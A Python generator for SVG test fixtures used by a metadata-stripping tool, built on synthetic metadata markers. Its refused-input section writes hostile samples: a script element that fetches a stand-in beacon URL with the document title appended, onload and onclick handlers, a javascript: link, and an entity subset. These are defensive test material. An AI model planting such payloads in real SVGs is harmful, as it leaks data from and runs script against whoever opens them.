#!/usr/bin/env python3
"""Generate the SVG fixtures in ``corpus/svg``.

Deterministic: two runs produce byte-identical files, so a fixture appearing in ``git diff``
means this generator changed. No third-party dependencies, by design — a corpus that only
regenerates on a machine with a particular library installed is a corpus nobody regenerates.

**Every fixture is a real, renderable SVG.** That matters more here than for any other format
in this tree: mat2's SVG path loads the document through Rsvg and *re-renders* it onto a Cairo
surface (``docs/DECISIONS.md`` ADR-0035), so a fixture Rsvg cannot open makes the differential
comparison say nothing at all — the mistake the WebP comparison made for two days
(``docs/THREAT_MODEL.md`` section 7.4).

**No fixture contains real personal data.** Every identifying value is a ``SYNTHETIC-...-000N``
marker, so a test can assert on the *bytes of the output* rather than on strypt's own report —
a handler that forgot to remove something would still cheerfully report having removed it.

Unlike every other generator here, this one embeds a marker **in the drawing itself** as well:
``id="PRESERVED-SHAPE"`` on a rectangle every fixture carries. SVG is the one format where the
picture is text, so "the payload crossed intact" is checkable by looking for a string rather
than by walking a compressed block, and the integration tests do exactly that.
"""

import base64
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
OUT = ROOT / "svg"
MALFORMED = OUT / "malformed"

SVG_NS = "http://www.w3.org/2000/svg"
XLINK_NS = "http://www.w3.org/1999/xlink"

# The one element every fixture shares. A test asserts it survives, which is how "the picture is
# not touched" is checked without re-implementing a renderer.
SHAPE = '<rect id="PRESERVED-SHAPE" x="1" y="1" width="6" height="6" fill="#3366cc"/>'


def document(attributes="", body="", prologue="", ns=""):
    """Wrap a body in a minimal, genuinely renderable SVG."""
    return (
        f'{prologue}<svg xmlns="{SVG_NS}"{ns} width="8" height="8" viewBox="0 0 8 8"'
        f"{attributes}>{body}</svg>\n"
    )


def png_with_text():
    """A 1x1 PNG carrying a ``tEXt`` chunk, for the embedded-image fixture.

    Built here rather than read from ``corpus/png`` so that this generator has no ordering
    dependency on another one, and so that the marker in it is this fixture's own.
    """
    import struct
    import zlib

    def chunk(kind, data):
        body = kind + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body))

    header = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", header)
        + chunk(b"tEXt", b"Author\x00SYNTHETIC-EMBEDDED-AUTHOR-0011")
        + chunk(b"IDAT", zlib.compress(b"\x00\x00"))
        + chunk(b"IEND", b"")
    )


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    data = text.encode("utf-8") if isinstance(text, str) else text
    path.write_bytes(data)
    print(f"  {path.relative_to(ROOT.parent)} ({len(data)} bytes)")


def main():
    print("Generating SVG fixtures...")

    # ---- Well-formed ---------------------------------------------------------------------

    # The baseline. Nothing removable, so strypt must return it byte-identical.
    write(OUT / "clean.svg", document(body=SHAPE))

    # The element SVG 1.1 section 5.10 states is not rendered: RDF, Dublin Core, and a
    # Creative Commons licence, which is what Inkscape's document-properties dialog writes.
    write(
        OUT / "metadata-rdf.svg",
        document(
            ns=' xmlns:dc="http://purl.org/dc/elements/1.1/"'
            ' xmlns:cc="http://creativecommons.org/ns#"'
            ' xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"',
            body=(
                "<metadata><rdf:RDF><cc:Work>"
                "<dc:title>SYNTHETIC-TITLE-0001</dc:title>"
                "<dc:creator><cc:Agent>"
                "<dc:title>SYNTHETIC-CREATOR-0002</dc:title>"
                "</cc:Agent></dc:creator>"
                "<dc:date>2021-03-04T05:06:07</dc:date>"
                "<dc:rights>SYNTHETIC-RIGHTS-0003</dc:rights>"
                "</cc:Work></rdf:RDF></metadata>" + SHAPE
            ),
        ),
    )

    # What Inkscape actually writes, which is the most common real dirty SVG there is.
    # `sodipodi:docname` is the file's name on the author's disk and `inkscape:export-filename`
    # is an absolute path out of their home directory.
    write(
        OUT / "inkscape.svg",
        document(
            ns=' xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.0.dtd"'
            ' xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"',
            attributes=' inkscape:version="1.1.2 (SYNTHETIC-BUILD-0004)"'
            ' sodipodi:docname="SYNTHETIC-DOCNAME-0005.svg"',
            body=(
                '<sodipodi:namedview inkscape:current-layer="layer1"'
                ' inkscape:zoom="3.7416574" inkscape:cx="411.5" inkscape:cy="219.5"'
                ' inkscape:window-width="1920" inkscape:window-height="1043"'
                ' inkscape:document-rotation="0"/>'
                '<g inkscape:label="Layer 1" inkscape:groupmode="layer" id="layer1">'
                f'{SHAPE}</g>'
            ),
        ),
    )

    # What Illustrator writes. `<i:pgf>` is a compressed copy of the original AI document
    # hidden inside the exported SVG, and the generator comment names the application version.
    #
    # Illustrator declares those namespaces through entity references — `xmlns:i="&ns_ai;"` —
    # which needs a doctype with an internal subset, and strypt refuses one of those outright
    # (ADR-0035 section 8). The URIs are written literally here so that this fixture exercises
    # the private-namespace rule rather than the doctype refusal; `malformed/entity-subset.svg`
    # is what covers the other half.
    write(
        OUT / "illustrator.svg",
        document(
            prologue='<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!-- Generator: Adobe Illustrator 25.0.0, SVG Export Plug-In. "
            "SVG Version: 6.00 Build 0) SYNTHETIC-GENERATOR-0006 -->\n",
            ns=' xmlns:i="http://ns.adobe.com/AdobeIllustrator/10.0/"'
            ' xmlns:x="adobe:ns:meta/"',
            body='<i:pgf id="adobe_illustrator_pgf">SYNTHETIC-PGF-0007</i:pgf>'
            "<x:xmpmeta>SYNTHETIC-XMP-0008</x:xmpmeta>" + SHAPE,
        ),
    )

    # An XMP packet in the wrapper Adobe writes around it, which is a processing instruction
    # rather than an element and so needs the scanner to report what it usually steps over.
    write(
        OUT / "xmp-packet.svg",
        document(
            prologue='<?xml version="1.0" encoding="UTF-8"?>\n'
            '<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>\n',
            body=SHAPE
            + '<metadata><x:xmpmeta xmlns:x="adobe:ns:meta/">'
            "<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\">"
            # XMP puts its fields in attributes rather than in text, which is a second shape the
            # report has to itemise.
            '<rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/" '
            'xmp:CreatorTool="SYNTHETIC-CREATORTOOL-0009" '
            'xmp:CreateDate="2021-03-04T05:06:07Z" '
            'xmp:ModifyDate="2021-03-04T05:06:08Z" '
            'xmp:DocumentID="SYNTHETIC-DOCID-0009"/>'
            "</rdf:RDF></x:xmpmeta></metadata>"
            + '<?xpacket end="w"?>',
        ),
    )

    # A namespace no table knows. **The fixture that justifies the allow-list running in the
    # direction it does**: under a deny-list this survives precisely because nothing recognises
    # it (ADR-0035 section 6).
    write(
        OUT / "unknown-namespace.svg",
        document(
            ns=' xmlns:notatoolweveheardof="http://example.invalid/private"',
            attributes=' notatoolweveheardof:owner="SYNTHETIC-VENDOR-OWNER-0010"',
            body='<notatoolweveheardof:private>SYNTHETIC-VENDOR-BLOB-0012</notatoolweveheardof:private>'
            + SHAPE,
        ),
    )

    # A pasted photograph, which is how Inkscape stores one by default. The PNG inside carries
    # its own metadata, and ADR-0029's one-level descent is what reaches it.
    embedded = base64.b64encode(png_with_text()).decode("ascii")
    write(
        OUT / "embedded-image.svg",
        document(body=f'<image x="0" y="0" width="8" height="8" href="data:image/png;base64,{embedded}"/>{SHAPE}'),
    )

    # The same, written the way a document that predates SVG 2 spells it, and wrapped across
    # lines as a real editor wraps a long attribute.
    wrapped = "\n     ".join(embedded[i : i + 76] for i in range(0, len(embedded), 76))
    write(
        OUT / "embedded-image-xlink.svg",
        document(
            ns=f' xmlns:xlink="{XLINK_NS}"',
            body=f'<image width="8" height="8" xlink:href="data:image/png;base64,{wrapped}"/>{SHAPE}',
        ),
    )

    # Accessibility text, which strypt keeps and declares. It can name its author, which is why
    # it has to be declared rather than passed over in silence (ADR-0035 section 5).
    write(
        OUT / "accessibility-text.svg",
        document(
            body="<title>SYNTHETIC-TITLE-KEPT-0013</title>"
            "<desc>SYNTHETIC-DESC-KEPT-0014</desc>" + SHAPE
        ),
    )

    # References outside the document: one that fires when a reader opens the file, and one
    # that names a directory on the author's machine. Reported, never removed.
    write(
        OUT / "external-references.svg",
        document(
            body='<image width="4" height="4" href="../SYNTHETIC-LOCAL-PATH-KEPT-0015/photo.png"/>'
            '<rect x="4" y="4" width="4" height="4" fill="url(https://beacon.invalid/p.png)"/>'
            '<circle cx="4" cy="4" r="1" fill="url(#internal)"/>'
            '<defs><linearGradient id="internal"/></defs>' + SHAPE
        ),
    )

    # A stylesheet, whose comment fingerprints the producing tool exactly as an XML comment
    # does — and whose quoted string contains something that looks like one and is not.
    write(
        OUT / "stylesheet.svg",
        document(
            body="<style>/* Generated by SYNTHETIC-CSS-TOOL-0016 */\n"
            '.shape { fill: #3366cc; }\n'
            '.quoted { content: "/* SYNTHETIC-NOT-A-COMMENT-KEPT-0017 */"; }\n'
            "</style>" + SHAPE.replace('fill="#3366cc"', 'class="shape"')
        ),
    )

    # A doctype with no internal subset, which is the format's boilerplate and stays.
    write(
        OUT / "doctype.svg",
        document(
            prologue='<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
            '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
            '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
            "<!-- SYNTHETIC-DOCTYPE-COMMENT-0018 -->\n",
            body=SHAPE,
        ),
    )

    # Comments scattered where a hand-editing author leaves them, including one inside an
    # element that is itself being removed.
    write(
        OUT / "comments.svg",
        document(
            prologue="<!-- SYNTHETIC-LEADING-COMMENT-0019 -->\n",
            ns=' xmlns:dc="http://purl.org/dc/elements/1.1/"',
            body="<!-- SYNTHETIC-BODY-COMMENT-0020 -->"
            "<metadata><!-- SYNTHETIC-NESTED-COMMENT-0021 -->"
            "<dc:creator>SYNTHETIC-NESTED-CREATOR-0022</dc:creator></metadata>"
            + SHAPE
            + "<!-- SYNTHETIC-TRAILING-COMMENT-0023 -->",
        ),
    )

    # Everything at once, which is what a real exported-then-edited file looks like.
    write(
        OUT / "kitchen-sink.svg",
        document(
            prologue='<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!-- SYNTHETIC-SINK-COMMENT-0024 -->\n",
            ns=' xmlns:dc="http://purl.org/dc/elements/1.1/"'
            ' xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"'
            f' xmlns:xlink="{XLINK_NS}"',
            attributes=' inkscape:version="SYNTHETIC-SINK-VERSION-0025"',
            body="<metadata><dc:creator>SYNTHETIC-SINK-CREATOR-0026</dc:creator></metadata>"
            "<title>SYNTHETIC-SINK-TITLE-KEPT-0027</title>"
            "<style>/* SYNTHETIC-SINK-CSS-0028 */.s{opacity:1}</style>"
            f'<image width="4" height="4" xlink:href="data:image/png;base64,{embedded}"/>'
            '<g inkscape:label="SYNTHETIC-SINK-LAYER-0029">' + SHAPE + "</g>",
        ),
    )

    # ---- Refused rather than cleaned ------------------------------------------------------

    # ADR-0035 section 2. Each of these is a document that runs code when a reader opens it,
    # and strypt refuses rather than reporting success on a file nobody examined.
    write(
        MALFORMED / "script-element.svg",
        document(body="<script>fetch('https://beacon.invalid/' + document.title)</script>" + SHAPE),
    )
    write(
        MALFORMED / "event-handler.svg",
        document(attributes=' onload="fetch(0)"', body=SHAPE),
    )
    write(
        MALFORMED / "event-handler-nested.svg",
        document(body=SHAPE.replace("/>", ' onclick="alert(1)"/>')),
    )
    write(
        MALFORMED / "foreign-object.svg",
        document(
            body='<foreignObject width="8" height="8">'
            '<div xmlns="http://www.w3.org/1999/xhtml">text</div></foreignObject>' + SHAPE
        ),
    )
    write(
        MALFORMED / "javascript-href.svg",
        document(body=f'<a href="javascript:alert(1)">{SHAPE}</a>'),
    )

    # An internal subset. Removing it would leave `&who;` pointing at nothing, and keeping it
    # means keeping entity declarations (ADR-0035 section 8).
    write(
        MALFORMED / "entity-subset.svg",
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE svg [<!ENTITY who "SYNTHETIC-ENTITY-0030">]>\n'
        f'<svg xmlns="{SVG_NS}" width="8" height="8"><text>&who;</text>{SHAPE}</svg>\n',
    )

    # A container hiding in a data: URI. It carries its own metadata that one pass cannot
    # reach, so the document is refused rather than reported clean.
    pdf = base64.b64encode(b"%PDF-1.4\n1 0 obj\n<< /Author (SYNTHETIC-PDF-0031) >>\nendobj\n").decode("ascii")
    write(
        MALFORMED / "data-uri-pdf.svg",
        document(body=f'<image width="8" height="8" href="data:application/pdf;base64,{pdf}"/>'),
    )

    # An SVG inside an SVG, which is the same refusal and is also what keeps the descent one
    # level deep by construction rather than by a counter.
    inner = base64.b64encode(document(body=SHAPE).encode("utf-8")).decode("ascii")
    write(
        MALFORMED / "data-uri-svg.svg",
        document(body=f'<image width="8" height="8" href="data:image/svg+xml;base64,{inner}"/>'),
    )

    # Not UTF-8. A scanner reading UTF-16 as UTF-8 finds no tags at all and would report a
    # clean file, which is `docs/THREAT_MODEL.md` section 5.4 wearing a success message.
    write(
        MALFORMED / "utf16.svg",
        document(body=SHAPE).encode("utf-16"),
    )

    print("Done.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
